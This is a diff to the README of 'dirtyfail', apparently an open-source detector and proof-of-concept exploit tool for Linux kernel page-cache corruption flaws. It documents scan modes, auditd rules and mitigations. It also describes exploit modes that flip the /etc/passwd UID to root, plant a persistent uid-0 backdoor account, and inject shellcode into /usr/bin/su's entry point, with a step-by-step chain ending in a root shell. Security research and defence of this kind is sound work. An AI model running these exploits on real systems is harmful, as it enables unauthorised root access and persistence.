@@ -570,97 +570,117 @@ make static CC=musl-gcc
 
 ## 6. Usage
 
-```
-$ ./dirtyfail --help
-Usage: ./dirtyfail [MODE] [OPTIONS]
+`./dirtyfail --help` is the canonical reference; the modes broken
+out by category:
 
-Modes (pick one; default is --scan):
-  --scan                 detect all three CVEs (no system modification)
-  --check-copyfail       Copy Fail (CVE-2026-31431) detection only
-  --check-esp            Dirty Frag xfrm-ESP (CVE-2026-43284) detection only
-  --check-rxrpc          Dirty Frag RxRPC   (CVE-2026-43500) detection only
-  --check-esp6           IPv6 xfrm-ESP path detection
-  --check-gcm            Copy Fail GCM (rfc4106) variant detection
-  --exploit-copyfail     real PoC: flip /etc/passwd UID via algif_aead
-  --exploit-esp          real PoC: flip /etc/passwd UID via xfrm-ESP (v4)
-  --exploit-esp6         real PoC: flip /etc/passwd UID via xfrm-ESP (v6)
-  --exploit-rxrpc        real PoC: empty /etc/passwd root pwd via rxkad
-                         (fcrypt brute-force + AF_RXRPC handshake forgery)
-  --exploit-gcm          real PoC: flip /etc/passwd UID via rfc4106(gcm(aes))
-  --exploit-backdoor     PERSISTENT: insert dirtyfail::0:0:..:/:/bin/bash uid-0 user
-  --cleanup              evict /etc/passwd from page cache and drop_caches
-  --cleanup-backdoor     restore /etc/passwd line from /var/tmp/.dirtyfail.state
-  --aa-bypass            (DEBUG ONLY) arm a legacy whole-process AA bypass.
-                         Exploit modes do their own fork-based bypass and do
-                         NOT need this flag — see §8.5 Architecture.
+**Detection (safe; no system modification):**
 
-Options:
-  --no-shell             after a successful exploit, do NOT execve `su`;
-                         instead revert the page-cache patch and exit
-  --no-color             disable ANSI color in output
-```
+| Mode | What it does |
+|---|---|
+| `--scan` | Run all five detectors (default mode) |
+| `--scan --active` | Add a sentinel-file STORE probe per CVE — distinguishes preconds-met from actually-exploitable |
+| `--scan --json` | Emit a single JSON object on stdout (SIEM-friendly); logs go to stderr |
+| `--check-copyfail` / `--check-esp` / `--check-esp6` / `--check-rxrpc` / `--check-gcm` | Per-CVE detection only |
 
-### Detection (safe; no system modification)
+**Exploitation (typed-confirmation gated; corrupts `/etc/passwd` page cache):**
+
+| Mode | What it does |
+|---|---|
+| `--exploit-copyfail` | UID flip via `algif_aead` 4-byte primitive |
+| `--exploit-esp` | UID flip via xfrm-ESP v4 (needs userns+CAP_NET_ADMIN) |
+| `--exploit-esp6` | UID flip via xfrm-ESP v6 |
+| `--exploit-rxrpc` | Empty root password field via rxkad fcrypt brute force |
+| `--exploit-gcm` | UID flip via `rfc4106(gcm(aes))` single-byte primitive |
+| `--exploit-backdoor` | PERSISTENT: insert `dirtyfail::0:0:...:/:/bin/bash` |
+| `--exploit-su` | V4bel-style: plant arch-specific shellcode at `/usr/bin/su` entry point. x86_64 tested end-to-end; aarch64 ships hardware-untested (gated behind `DIRTYFAIL_AARCH64_TRUST_UNTESTED=1`) |
+
+**Cleanup / state inspection:**
+
+| Mode | What it does |
+|---|---|
+| `--cleanup` | Evict `/etc/passwd` from page cache (`fadvise` + `drop_caches` if root) |
+| `--cleanup-backdoor` | Restore the original `/etc/passwd` line from state file |
+| `--cleanup-su` | Restore `/usr/bin/su` entry-point bytes from state file |
+| `--list-state` | Report what (if anything) is currently planted; side-effect-free |
+
+**Defensive (root required):**
+
+| Mode | What it does |
+|---|---|
+| `--mitigate` | Blacklist `algif_aead`/`esp4`/`esp6`/`rxrpc` modules; set `apparmor_restrict_unprivileged_userns=1`; drop_caches. Side-effects: breaks IPsec, AFS |
+| `--cleanup-mitigate` | Remove the modprobe/sysctl files installed by `--mitigate` |
+
+**Common options:**
+
+| Flag | Effect |
+|---|---|
+| `--no-shell` | After a successful exploit, do NOT `execve su` — verify and revert |
+| `--no-revert` | With `--no-shell`, also skip the auto-revert (used by the container-escape demo) |
+| `--active` | Add active sentinel-STORE probes to `--scan`/`--check-*` |
+| `--json` | (with `--scan`) emit machine-readable output |
+| `--no-color` | Disable ANSI color |
+| `--aa-bypass` | (DEBUG only) force the AppArmor unprivileged-userns bypass — exploits do this internally, see §8.5 |
+
+### Detection examples
+
+Plain scan (preconditions only — fast, ~1s):
 
 ```sh
 ./dirtyfail --scan
 ```
 
-Sample output on a vulnerable Ubuntu 24.04:
-
-```
-[*] Copy Fail (CVE-2026-31431) — detection
-[i] kernel 6.17.x (affected lines: 6.12, 6.17, 6.18)
-[+] AF_ALG + authencesn(hmac(sha256),cbc(aes)) loadable
-[*] triggering primitive against /tmp/copyfail-sentinel.XXXX with marker 'PWND'
-[!] VULNERABLE — marker 'PWND' landed at sentinel offset 24
-
-[*] Dirty Frag — xfrm-ESP variant (CVE-2026-43284) — detection
-[i] kernel 6.17.x
-[i] esp4 currently loaded: yes
-[i] esp6 currently loaded: yes
-[i] unprivileged user namespace: allowed
-[!] VULNERABLE (preconditions met) — userns + xfrm SA registration available
-
-[*] Dirty Frag — RxRPC variant (CVE-2026-43500) — detection
-[i] rxrpc currently loaded: yes
-[i] AF_RXRPC socket: openable
-[!] VULNERABLE — RxRPC variant of Dirty Frag is reachable
-```
-
-### Exploit (requires typed confirmation)
+Active sentinel probe per CVE (~10s, modifies `/tmp` sentinels only):
 
 ```sh
-./dirtyfail --exploit-copyfail
+./dirtyfail --scan --active
 ```
 
-You will be prompted to type `DIRTYFAIL` and press enter before any
-page-cache modification happens. After a successful flip, DIRTYFAIL
-invokes `su <yourname>`; type your **own** password — PAM still
-checks against the untouched `/etc/shadow`, then `setuid(0)` lands
-at root because the page cache says you are uid 0.
-
-To run the exploit without spawning a shell (useful for CI / repeated
-testing):
+JSON for SIEM/fleet ingestion:
 
 ```sh
-./dirtyfail --exploit-copyfail --no-shell
+$ ./dirtyfail --scan --active --json
+{
+  "tool": "dirtyfail",
+  "version": "0.1.0",
+  "hostname": "server-01",
+  "kernel": "6.19.10-300.fc44.x86_64",
+  "machine": "x86_64",
+  "active_probes": true,
+  "results": [
+    {"cve": "CVE-2026-31431",     "name": "copyfail",        "status": "vulnerable"},
+    {"cve": "CVE-2026-43284",     "name": "dirtyfrag-esp",   "status": "vulnerable"},
+    {"cve": "CVE-2026-43284-v6",  "name": "dirtyfrag-esp6",  "status": "vulnerable"},
+    {"cve": "CVE-2026-43500",     "name": "dirtyfrag-rxrpc", "status": "vulnerable"},
+    {"cve": "CVE-2026-31431-gcm", "name": "copyfail-gcm",    "status": "vulnerable"}
+  ],
+  "summary": "vulnerable"
+}
 ```
 
-This applies the patch, verifies it landed, then evicts
-`/etc/passwd` from the page cache via `POSIX_FADV_DONTNEED` so the
-system returns to a clean state.
+Status values: `vulnerable`, `not_vulnerable`, `preconds_missing`,
+`test_error`. The summary echoes the worst across results.
 
-### Cleanup
-
-After any exploit run:
+### Exploit examples (typed confirmation required)
 
 ```sh
-./dirtyfail --cleanup           # evict /etc/passwd from page cache
-sudo ./dirtyfail --cleanup      # also drop_caches (requires root)
+./dirtyfail --exploit-copyfail              # UID-flip + drop into root via su
+./dirtyfail --exploit-su                    # plant /bin/sh shellcode at /usr/bin/su entry
+./dirtyfail --exploit-copyfail --no-shell   # plant + verify + auto-revert (CI-safe)
 ```
 
-Or directly:
+Each exploit prompts for `DIRTYFAIL` + (where applicable)
+`YES_BREAK_SSH` before any page-cache modification.
+
+### State inspection + cleanup
+
+```sh
+./dirtyfail --list-state          # what's currently planted? (side-effect free)
+./dirtyfail --cleanup             # fadvise(DONTNEED) + drop_caches if root
+./dirtyfail --cleanup-backdoor    # restore /etc/passwd from .dirtyfail.state
+./dirtyfail --cleanup-su          # restore /usr/bin/su from .dirtyfail-su.state
+```
+
+Or fall through to the kernel directly:
 
 ```sh
 sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
@@ -689,25 +709,57 @@ Marker found ⇒ vulnerable. Marker absent but page contents differ ⇒
 the primitive partially fired (still vulnerable). Page identical ⇒
 not vulnerable on this kernel.
 
-### Dirty Frag xfrm-ESP (precondition-based)
+### Dirty Frag xfrm-ESP (precondition-based — or active with `--active`)
 
-Detection is precondition-only — we don't enter a user namespace in
-detect mode (it would side-effect networking inside that namespace).
-We check:
+Default `--scan` is precondition-only — we don't enter a user
+namespace in detect mode (it would side-effect networking inside
+that namespace). We check:
 
 * kernel version within affected window
 * `esp4` / `esp6` currently loaded or autoloadable
 * unprivileged user namespace creation succeeds (probed via fork →
   child `unshare(CLONE_NEWUSER)`)
+* AppArmor `apparmor_userns_caps_blocked()` returns false
 
-All three present ⇒ VULNERABLE.
+All four present ⇒ VULNERABLE (preconditions met).
 
-### Dirty Frag RxRPC (precondition-based)
+`--scan --active` extends this with a sentinel-STORE probe: we fork
+a child that arms the AA bypass, enters a fresh user/net namespace,
+registers an XFRM SA, and fires the ESP-in-UDP trigger against a
+`/tmp/dirtyfail-esp-probe.XXXXXX` sentinel file. The parent re-reads
+the sentinel and looks for the marker bytes:
 
+* marker landed → kernel STORE is reachable → **VULNERABLE**
+* page intact → kernel patch is in effect → **NOT VULNERABLE**
+* AA bypass denied → **PRECOND_FAIL** (LSM-mitigated)
+
+This is the only way to distinguish a backported-patched kernel
+from an unpatched one without running the full UID-flip exploit
+against `/etc/passwd`. The same pattern is used for ESP v6, RxRPC,
+and GCM under `--active`.
+
+### Dirty Frag RxRPC (precondition-based — or active with `--active`)
+
+Preconditions:
 * `rxrpc` in `/proc/modules` or autoloadable
 * `socket(AF_RXRPC, SOCK_DGRAM, 0)` succeeds
 
-Either ⇒ VULNERABLE.
+Active probe (`--active`): forks via AA bypass, registers an rxrpc
+session key with an arbitrary 8-byte value, sends one CHALLENGE +
+DATA forgery against a `/tmp` sentinel, looks for ANY byte change
+inside the spliced 8-byte window. We don't try to predict what
+landed — any modification confirms the kernel STORE fires.
+
+### Copy Fail GCM variant + ESP v6 — same shape
+
+The GCM variant active probe installs a transport-mode SA with an
+arbitrary IV and fires `gcm_trigger` against a `/tmp` sentinel; ANY
+byte change at sentinel[0] confirms reachability. The ESP v6 probe
+also auto-calibrates `V6_STORE_SHIFT` per kernel build (see
+`calibrate_v6_shift` in `src/dirtyfrag_esp6.c`) — different distros'
+`esp6_input` builds put the STORE at slightly different offsets
+inside the spliced region, and the calibration probe discovers the
+exact offset before the real exploit fires.
 
 ---
 
@@ -792,6 +844,61 @@ final step as Copy Fail.
    su  → setresuid(0,0,0) → exec /bin/bash
                                        ─────► root shell
 ```
+
+### `--exploit-su` shellcode injection (`exploit_su.c`)
+
+A second `/etc/passwd`-free attack chain modeled on V4bel's reference
+exploit. Instead of editing `/etc/passwd`'s page cache, we plant
+arch-specific shellcode at `/usr/bin/su`'s ELF entry point in its
+page cache; the next time anyone exec's `/usr/bin/su`, the kernel
+sets euid=0 from the on-disk setuid bit, the dynamic linker
+resolves, and control transfers to our shellcode → `/bin/sh` as
+real init-ns root. No PAM dependency, bypasses `pam_unix nullok`
+removal entirely.
+
+```
+parent (init ns)
+   │ stat /usr/bin/su; verify setuid+root
+   │ parse ELF header; resolve e_entry → file offset
+   │ pread() N bytes at file_offset → /var/tmp/.dirtyfail-su.state
+   │ for each 4-byte chunk of shellcode:
+   │     cf_4byte_write("/usr/bin/su", file_offset+i, chunk)
+   │ pread() back; verify match
+   │ if --no-shell:
+   │    plant_shellcode(original)        # revert via re-write
+   │    fadvise(DONTNEED) on a new fd     # evict if possible
+   │ else:
+   │    execl("/usr/bin/su", "su", NULL) ─►
+   │                                       kernel exec /usr/bin/su (setuid root)
+   │                                       ld-linux.so resolves
+   │                                       jumps to e_entry → our shellcode
+   │                                       setuid(0); setgid(0);
+   │                                       execve("/bin/sh", argv, NULL)
+   ▼                                       ────► root shell
+```
+
+Architecture matrix:
+
+* **x86_64 (56 bytes, 14 chained 4-byte writes)** — tested
+  end-to-end on Fedora 44 (`uid=0(root) gid=0(root) ...
+  context=unconfined_u:unconfined_r:unconfined_t`). Shellcode in
+  `shellcode_x86_64[]`.
+* **aarch64 (80 bytes, 20 instructions)** — hand-encoded from the
+  ARMv8-A reference, **never executed on hardware**. Gated behind
+  `DIRTYFAIL_AARCH64_TRUST_UNTESTED=1`. Source ships in
+  `tools/exploit_su_aarch64.S` for community verification — assemble
+  with `aarch64-linux-gnu-as` and confirm the byte sequence matches
+  `shellcode_aarch64[]`.
+* anything else → preconds_fail.
+
+The state file `/var/tmp/.dirtyfail-su.state` stashes the original
+entry-point bytes so `--cleanup-su` can restore. `--list-state`
+inspects this file (and the backdoor's) without touching anything.
+
+If the verify step finds the page cache doesn't match the planted
+shellcode (kernel patched, AF_ALG blacklisted, etc.), the auto-revert
+fires immediately and the state file is removed — no need for the
+operator to run cleanup-su afterward.
 
 ---
 
@@ -959,6 +1066,44 @@ rmmod algif_aead esp4 esp6 rxrpc 2>/dev/null
 sysctl vm.drop_caches=3
 '
 ```
+
+### Or use `dirtyfail --mitigate`
+
+The same set of mitigations is wrapped in a typed-confirmation gated
+defensive mode:
+
+```sh
+sudo ./dirtyfail --mitigate
+```
+
+This drops in `/etc/modprobe.d/dirtyfail-mitigations.conf` and
+`/etc/sysctl.d/99-dirtyfail-mitigations.conf`, unloads the four
+modules, and `drop_caches`. Reverts via `sudo ./dirtyfail
+--cleanup-mitigate`. Side-effects: breaks IPsec, AFS clients, and
+any userspace using `AF_ALG` AEAD. See `docs/DEFENDERS.md` for the
+full sysadmin playbook.
+
+### Detection / monitoring
+
+For ongoing detection independent of patching:
+
+* **Scan a host:** `dirtyfail --scan --active` (full sentinel-STORE
+  probe) or `dirtyfail --scan --active --json` for SIEM/fleet
+  ingestion. The `tools/dirtyfail-check.sh` bash variant has zero
+  build dependencies.
+* **Audit rules:** `tools/99-dirtyfail.rules` is a drop-in auditd
+  ruleset covering the five syscall paths the exploit chain uses
+  (XFRM netlink registration, `add_key("rxrpc")`,
+  `unshare(CLONE_NEWUSER)`, `AF_ALG` socket creation,
+  `/etc/passwd`/`/etc/shadow` writes). Install with:
+  ```sh
+  sudo install -m 0640 tools/99-dirtyfail.rules /etc/audit/rules.d/
+  sudo augenrules --load && sudo systemctl restart auditd
+  ```
+* **Container blast-radius demo:**
+  `tools/dirtyfail-container-escape.sh` shows that the kernel page
+  cache is shared across namespaces — useful for explaining the
+  cross-tenant impact to operators.
 
 ---
 
